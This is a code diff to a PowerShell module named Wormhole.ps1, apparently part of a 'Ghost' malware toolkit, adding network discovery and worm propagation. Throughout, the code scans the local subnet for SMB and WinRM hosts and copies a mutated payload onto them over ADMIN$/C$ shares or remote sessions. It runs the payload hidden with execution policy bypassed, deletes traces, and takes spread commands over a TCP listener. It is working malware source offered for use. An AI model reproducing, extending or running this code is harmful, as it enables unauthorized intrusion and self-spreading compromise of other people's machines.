@@ -1,10 +1,27 @@
-# Modules/Wormhole.ps1
-# Wormhole Protocol - Stealth propagation with operator handshake gating
-# Memory-only propagation, no persistent writes
+# Modules/Wormhole.ps1 v1.6.0
+# Wormhole Protocol - Advanced stealth propagation with network discovery
+# Memory-only propagation with operator handshake gating
 
+$script:Version = "1.6.0"
 $script:InfectionMap = @{}
+$script:DiscoveredHosts = @{}
 $script:OperatorKey = 'RvL_0517'
 $script:WormholeActive = $false
+$script:PropagationStats = @{
+    Attempts = 0
+    Successes = 0
+    Failures = 0
+    Blocked = 0
+}
+
+function Write-WormholeLog {
+    param([string]$Message, [string]$Level = "INFO")
+    $logFile = "$env:ProgramData\ghost_ops_log.txt"
+    $timestamp = Get-Date -Format o
+    try {
+        Add-Content -Path $logFile -Value "[$timestamp][Wormhole][$Level] $Message" -ErrorAction SilentlyContinue
+    } catch {}
+}
 
 function Get-OperatorSignature {
     param([string]$Data)
@@ -30,71 +47,276 @@ function Test-AlreadyInfected {
 }
 
 function Register-Infection {
-    param([string]$HostId)
+    param(
+        [string]$HostId,
+        [string]$Method = "Unknown",
+        [hashtable]$Metadata = @{}
+    )
+    
     $script:InfectionMap[$HostId] = @{
         Timestamp = (Get-Date).ToUniversalTime()
         Status = "Active"
+        Method = $Method
+        Metadata = $Metadata
     }
-    Write-GhostLog "Registered infection for host: $HostId"
+    Write-WormholeLog "Registered infection for host: $HostId via $Method"
 }
 
 function Get-HostIdentifier {
-    $mac = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
-    $hostname = $env:COMPUTERNAME
-    return Get-OperatorSignature -Data "$hostname|$mac"
+    param([string]$HostName = $env:COMPUTERNAME)
+    
+    try {
+        $mac = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
+    } catch {
+        $mac = "UNKNOWN"
+    }
+    return Get-OperatorSignature -Data "$HostName|$mac"
+}
+
+function Invoke-NetworkDiscovery {
+    param(
+        [string]$Subnet,
+        [switch]$Fast,
+        [int]$Timeout = 1000
+    )
+    
+    Write-WormholeLog "Starting network discovery..."
+    
+    if (-not $Subnet) {
+        try {
+            $localIP = (Get-NetIPAddress -AddressFamily IPv4 | 
+                       Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -notmatch "^169" } | 
+                       Select-Object -First 1).IPAddress
+            $Subnet = $localIP -replace '\.\d+$', ''
+        } catch {
+            Write-WormholeLog "Could not determine local subnet" "ERROR"
+            return @()
+        }
+    }
+    
+    Write-WormholeLog "Scanning subnet: $Subnet.0/24"
+    
+    $discovered = @()
+    $pingJobs = @()
+    
+    $range = if ($Fast) { 1..50 + 100..150 + 200..254 } else { 1..254 }
+    
+    foreach ($octet in $range) {
+        $ip = "$Subnet.$octet"
+        
+        $pingJobs += [PSCustomObject]@{
+            IP = $ip
+            Task = [System.Net.NetworkInformation.Ping]::new().SendPingAsync($ip, $Timeout)
+        }
+    }
+    
+    foreach ($job in $pingJobs) {
+        try {
+            $result = $job.Task.GetAwaiter().GetResult()
+            if ($result.Status -eq 'Success') {
+                $hostInfo = @{
+                    IP = $job.IP
+                    Hostname = "Unknown"
+                    RTT = $result.RoundtripTime
+                    DiscoveredAt = (Get-Date).ToUniversalTime()
+                    SMBOpen = $false
+                    WinRMOpen = $false
+                }
+                
+                try {
+                    $hostInfo.Hostname = [System.Net.Dns]::GetHostEntry($job.IP).HostName
+                } catch {}
+                
+                $hostInfo.SMBOpen = Test-NetConnection -ComputerName $job.IP -Port 445 -WarningAction SilentlyContinue -InformationLevel Quiet
+                $hostInfo.WinRMOpen = Test-NetConnection -ComputerName $job.IP -Port 5985 -WarningAction SilentlyContinue -InformationLevel Quiet
+                
+                $discovered += $hostInfo
+                $script:DiscoveredHosts[$job.IP] = $hostInfo
+                
+                Write-WormholeLog "Discovered: $($job.IP) ($($hostInfo.Hostname)) SMB:$($hostInfo.SMBOpen) WinRM:$($hostInfo.WinRMOpen)"
+            }
+        } catch {}
+    }
+    
+    Write-WormholeLog "Discovery complete: $($discovered.Count) hosts found"
+    return $discovered
+}
+
+function Get-SpreadTargets {
+    param(
+        [switch]$SMBOnly,
+        [switch]$WinRMOnly,
+        [int]$Limit = 10
+    )
+    
+    $targets = $script:DiscoveredHosts.Values | Where-Object {
+        $hostId = Get-HostIdentifier -HostName $_.Hostname
+        -not (Test-AlreadyInfected -HostId $hostId)
+    }
+    
+    if ($SMBOnly) {
+        $targets = $targets | Where-Object { $_.SMBOpen }
+    }
+    
+    if ($WinRMOnly) {
+        $targets = $targets | Where-Object { $_.WinRMOpen }
+    }
+    
+    return $targets | Select-Object -First $Limit
 }
 
 function Invoke-WormholeSpread {
     param(
+        [Parameter(Mandatory)]
         [string]$TargetHost,
+        
         [string]$PayloadPath,
-        [switch]$ForceSMB
+        
+        [ValidateSet("SMB", "WinRM", "Auto")]
+        [string]$Method = "Auto",
+        
+        [switch]$Force
     )
     
-    $targetId = "$TargetHost|spread"
+    $script:PropagationStats.Attempts++
     
-    if (Test-AlreadyInfected -HostId $targetId) {
-        Write-GhostLog "Skipping $TargetHost - already infected"
+    $targetId = Get-HostIdentifier -HostName $TargetHost
+    
+    if (-not $Force -and (Test-AlreadyInfected -HostId $targetId)) {
+        Write-WormholeLog "Skipping $TargetHost - already infected"
+        $script:PropagationStats.Blocked++
         return $false
     }
     
-    $challenge = [guid]::NewGuid().ToString()
-    $timestamp = (Get-Date).ToUniversalTime().ToString("o")
-    
-    if (-not (Test-BLEOperatorPresent) -and -not $ForceSMB) {
-        Write-GhostLog "No BLE operator detected - hard-fail exit"
+    if (-not (Test-BLEOperatorPresent)) {
+        Write-WormholeLog "No BLE operator detected - hard-fail exit" "WARN"
+        $script:PropagationStats.Blocked++
         return $false
     }
+    
+    Write-WormholeLog "Attempting spread to $TargetHost via $Method"
     
     try {
-        if ($ForceSMB -or (Test-Path "\\$TargetHost\ADMIN$")) {
-            $remotePath = "\\$TargetHost\ADMIN$\Temp\ghost_payload.ps1"
+        $success = $false
+        
+        if ($Method -eq "Auto" -or $Method -eq "WinRM") {
+            $success = Invoke-WinRMSpread -TargetHost $TargetHost -PayloadPath $PayloadPath
+        }
+        
+        if (-not $success -and ($Method -eq "Auto" -or $Method -eq "SMB")) {
+            $success = Invoke-SMBSpread -TargetHost $TargetHost -PayloadPath $PayloadPath
+        }
+        
+        if ($success) {
+            Register-Infection -HostId $targetId -Method $Method -Metadata @{ 
+                TargetHost = $TargetHost
+                SpreadTime = (Get-Date).ToUniversalTime()
+            }
+            $script:PropagationStats.Successes++
+            Write-WormholeLog "Spread to $TargetHost successful" "SUCCESS"
+        } else {
+            $script:PropagationStats.Failures++
+            Write-WormholeLog "Spread to $TargetHost failed" "WARN"
+        }
+        
+        return $success
+        
+    } catch {
+        $script:PropagationStats.Failures++
+        Write-WormholeLog "Spread to $TargetHost error: $_" "ERROR"
+        return $false
+    }
+}
+
+function Invoke-SMBSpread {
+    param(
+        [string]$TargetHost,
+        [string]$PayloadPath
+    )
+    
+    try {
+        $adminShare = "\\$TargetHost\ADMIN$"
+        if (-not (Test-Path $adminShare)) {
+            $c_share = "\\$TargetHost\C$"
+            if (-not (Test-Path $c_share)) {
+                return $false
+            }
+            $adminShare = $c_share
+        }
+        
+        $remotePath = "$adminShare\Windows\Temp\ghost_payload_$(Get-Random).ps1"
+        
+        if (-not $PayloadPath -or -not (Test-Path $PayloadPath)) {
+            $PayloadPath = Join-Path $PSScriptRoot "..\GhostResidency.ps1"
+        }
+        
+        if (Test-Path $PayloadPath) {
+            $payloadContent = Get-Content $PayloadPath -Raw
+            $mutatedPayload = Invoke-PayloadMutation -Content $payloadContent
+            
+            Set-Content -Path $remotePath -Value $mutatedPayload -Force
+            
+            $localPath = $remotePath -replace '^\\\\.+?\\[^\\]+', 'C:'
+            
+            $result = Invoke-Command -ComputerName $TargetHost -ScriptBlock {
+                param($path)
+                if (Test-Path $path) {
+                    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$path`""
+                    Start-Sleep -Seconds 2
+                    Remove-Item $path -Force -ErrorAction SilentlyContinue
+                    return $true
+                }
+                return $false
+            } -ArgumentList $localPath -ErrorAction SilentlyContinue
+            
+            return $result
+        }
+        
+    } catch {
+        Write-WormholeLog "SMB spread failed: $_" "ERROR"
+    }
+    
+    return $false
+}
+
+function Invoke-WinRMSpread {
+    param(
+        [string]$TargetHost,
+        [string]$PayloadPath
+    )
+    
+    try {
+        $session = New-PSSession -ComputerName $TargetHost -ErrorAction SilentlyContinue
+        if (-not $session) { return $false }
+        
+        try {
+            if (-not $PayloadPath -or -not (Test-Path $PayloadPath)) {
+                $PayloadPath = Join-Path $PSScriptRoot "..\GhostResidency.ps1"
+            }
             
             if (Test-Path $PayloadPath) {
                 $payloadContent = Get-Content $PayloadPath -Raw
                 $mutatedPayload = Invoke-PayloadMutation -Content $payloadContent
                 
-                Set-Content -Path $remotePath -Value $mutatedPayload -Force
-                
-                $result = Invoke-Command -ComputerName $TargetHost -ScriptBlock {
-                    param($path)
-                    if (Test-Path $path) {
-                        & $path
-                        Remove-Item $path -Force
-                        return $true
-                    }
-                    return $false
-                } -ArgumentList "C:\Windows\Temp\ghost_payload.ps1" -ErrorAction SilentlyContinue
-                
-                if ($result) {
-                    Register-Infection -HostId $targetId
+                $result = Invoke-Command -Session $session -ScriptBlock {
+                    param($content)
+                    $tempPath = "$env:TEMP\ghost_$(Get-Random).ps1"
+                    Set-Content -Path $tempPath -Value $content
+                    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempPath`""
+                    Start-Sleep -Seconds 2
+                    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
                     return $true
-                }
+                } -ArgumentList $mutatedPayload
+                
+                return $result
             }
+            
+        } finally {
+            Remove-PSSession -Session $session -ErrorAction SilentlyContinue
         }
-    }
-    catch {
-        Write-GhostLog "Spread to $TargetHost failed: $_"
+        
+    } catch {
+        Write-WormholeLog "WinRM spread failed: $_" "ERROR"
     }
     
     return $false
@@ -104,9 +326,23 @@ function Invoke-PayloadMutation {
     param([string]$Content)
     
     $mutations = @(
-        { param($c) $c -replace 'function\s+', "function Ghost$([guid]::NewGuid().ToString().Substring(0,8))_" },
-        { param($c) $c -replace '\$(\w+)', "`$g$([char](Get-Random -Minimum 97 -Maximum 123))`$1" },
-        { param($c) "# $(Get-Random)`n$c" }
+        { param($c) 
+            $funcName = "Ghost$([guid]::NewGuid().ToString().Substring(0,8))"
+            $c -replace 'function\s+(\w+)', "function $funcName`_`$1"
+        },
+        { param($c) 
+            $junkComment = "# $([guid]::NewGuid().ToString()) - $(Get-Date -Format o)"
+            "$junkComment`n$c"
+        },
+        { param($c)
+            $c -replace '#.*$', '' -replace '^\s*$\n', ''
+        },
+        { param($c)
+            $lines = $c -split "`n"
+            $shuffledComments = $lines | Where-Object { $_ -match '^\s*#' } | Get-Random -Count ([math]::Min(5, ($lines | Where-Object { $_ -match '^\s*#' }).Count))
+            $junk = @("# GhostMutation: $([guid]::NewGuid())", "# Timestamp: $(Get-Date -Format o)")
+            ($junk + $lines) -join "`n"
+        }
     )
     
     $mutation = $mutations | Get-Random
@@ -117,15 +353,26 @@ function Test-BLEOperatorPresent {
     try {
         $bleDevices = Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue
         foreach ($device in $bleDevices) {
-            if ($device.FriendlyName -match "Ghost|Flipper|Operator") {
+            if ($device.FriendlyName -match "Ghost|Flipper|Operator|Raven|Beacon") {
                 return $true
             }
         }
-    }
-    catch {}
+    } catch {}
     
     if (Test-Path "$env:ProgramData\.ghost_ble_active") {
-        return $true
+        $markerAge = ((Get-Date) - (Get-Item "$env:ProgramData\.ghost_ble_active").LastWriteTime).TotalMinutes
+        if ($markerAge -lt 15) {
+            return $true
+        }
+    }
+    
+    if (Test-Path "$env:ProgramData\.ghost.cfg") {
+        try {
+            $cfg = Get-Content "$env:ProgramData\.ghost.cfg" | ConvertFrom-Json
+            if ($cfg.signature -and $cfg.ghostTag) {
+                return $true
+            }
+        } catch {}
     }
     
     return $false
@@ -134,23 +381,32 @@ function Test-BLEOperatorPresent {
 function Start-WormholeListener {
     param(
         [int]$Port = 8787,
-        [int]$Timeout = 300
+        [int]$Timeout = 300,
+        [switch]$AutoSpread
     )
     
     if ($script:WormholeActive) {
-        Write-GhostLog "Wormhole already active"
+        Write-WormholeLog "Wormhole already active"
         return
     }
     
     $script:WormholeActive = $true
-    Write-GhostLog "Wormhole listener starting on port $Port"
+    Write-WormholeLog "Wormhole listener starting on port $Port"
     
     $hostId = Get-HostIdentifier
-    if (Test-AlreadyInfected -HostId $hostId) {
-        Write-GhostLog "This host already registered - skipping reinfection"
+    if (-not (Test-AlreadyInfected -HostId $hostId)) {
+        Register-Infection -HostId $hostId -Method "Origin"
     }
-    else {
-        Register-Infection -HostId $hostId
+    
+    if ($AutoSpread) {
+        Write-WormholeLog "Auto-spread enabled. Running network discovery..."
+        $targets = Invoke-NetworkDiscovery -Fast
+        $spreadTargets = Get-SpreadTargets -Limit 5
+        
+        foreach ($target in $spreadTargets) {
+            Invoke-WormholeSpread -TargetHost $target.IP -Method "Auto"
+            Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
+        }
     }
     
     try {
@@ -161,7 +417,7 @@ function Start-WormholeListener {
         
         while ($script:WormholeActive) {
             if (((Get-Date) - $startTime).TotalSeconds -gt $Timeout) {
-                Write-GhostLog "Wormhole timeout reached"
+                Write-WormholeLog "Wormhole timeout reached"
                 break
             }
             
@@ -184,33 +440,30 @@ function Start-WormholeListener {
                         
                         $command = $reader.ReadLine()
                         Process-WormholeCommand -Command $command -Writer $writer
-                    }
-                    else {
+                    } else {
                         $writer.WriteLine("REJECT")
-                        Write-GhostLog "Rejected unauthorized connection"
+                        Write-WormholeLog "Rejected unauthorized connection" "WARN"
                     }
-                }
-                finally {
+                } finally {
                     $client.Close()
                 }
             }
             
             Start-Sleep -Milliseconds 100
         }
-    }
-    catch {
-        Write-GhostLog "Wormhole error: $_"
-    }
-    finally {
+        
+    } catch {
+        Write-WormholeLog "Wormhole error: $_" "ERROR"
+    } finally {
         if ($listener) { $listener.Stop() }
         $script:WormholeActive = $false
-        Write-GhostLog "Wormhole listener stopped"
+        Write-WormholeLog "Wormhole listener stopped"
     }
 }
 
 function Stop-WormholeListener {
     $script:WormholeActive = $false
-    Write-GhostLog "Wormhole shutdown requested"
+    Write-WormholeLog "Wormhole shutdown requested"
 }
 
 function Process-WormholeCommand {
@@ -225,12 +478,28 @@ function Process-WormholeCommand {
     switch ($action) {
         "SPREAD" {
             $target = $parts[1]
-            $result = Invoke-WormholeSpread -TargetHost $target -PayloadPath "$PSScriptRoot\..\GhostResidency.ps1"
+            $method = if ($parts.Count -gt 2) { $parts[2] } else { "Auto" }
+            $result = Invoke-WormholeSpread -TargetHost $target -Method $method
             $Writer.WriteLine("SPREAD:$target:$result")
+        }
+        "DISCOVER" {
+            $subnet = if ($parts.Count -gt 1) { $parts[1] } else { $null }
+            $hosts = Invoke-NetworkDiscovery -Subnet $subnet -Fast
+            $Writer.WriteLine("DISCOVER:HOSTS:$($hosts.Count)")
+        }
+        "TARGETS" {
+            $targets = Get-SpreadTargets -Limit 20
+            $targetList = ($targets | ForEach-Object { "$($_.IP)|$($_.Hostname)" }) -join ','
+            $Writer.WriteLine("TARGETS:$targetList")
         }
         "STATUS" {
             $count = $script:InfectionMap.Count
-            $Writer.WriteLine("STATUS:HOSTS:$count")
+            $discovered = $script:DiscoveredHosts.Count
+            $Writer.WriteLine("STATUS:INFECTED:$count:DISCOVERED:$discovered")
+        }
+        "STATS" {
+            $stats = "A:$($script:PropagationStats.Attempts),S:$($script:PropagationStats.Successes),F:$($script:PropagationStats.Failures),B:$($script:PropagationStats.Blocked)"
+            $Writer.WriteLine("STATS:$stats")
         }
         "MAP" {
             $map = $script:InfectionMap.Keys -join ','
@@ -251,19 +520,26 @@ function Get-InfectionMap {
     return $script:InfectionMap.Clone()
 }
 
+function Get-DiscoveredHosts {
+    return $script:DiscoveredHosts.Clone()
+}
+
+function Get-PropagationStats {
+    return $script:PropagationStats.Clone()
+}
+
 function Clear-InfectionMap {
     $script:InfectionMap.Clear()
-    Write-GhostLog "Infection map cleared"
+    Write-WormholeLog "Infection map cleared"
 }
 
-function Write-GhostLog {
-    param([string]$Message)
-    $logFile = "$env:ProgramData\ghost_ops_log.txt"
-    $timestamp = Get-Date -Format o
-    try {
-        Add-Content -Path $logFile -Value "[$timestamp][Wormhole] $Message" -ErrorAction SilentlyContinue
-    }
-    catch {}
+function Clear-DiscoveredHosts {
+    $script:DiscoveredHosts.Clear()
+    Write-WormholeLog "Discovered hosts cleared"
 }
 
-Export-ModuleMember -Function Start-WormholeListener, Stop-WormholeListener, Invoke-WormholeSpread, Get-InfectionMap, Clear-InfectionMap, Test-BLEOperatorPresent
+Export-ModuleMember -Function Start-WormholeListener, Stop-WormholeListener
+Export-ModuleMember -Function Invoke-WormholeSpread, Invoke-NetworkDiscovery, Get-SpreadTargets
+Export-ModuleMember -Function Get-InfectionMap, Get-DiscoveredHosts, Get-PropagationStats
+Export-ModuleMember -Function Clear-InfectionMap, Clear-DiscoveredHosts
+Export-ModuleMember -Function Test-BLEOperatorPresent, Get-HostIdentifier
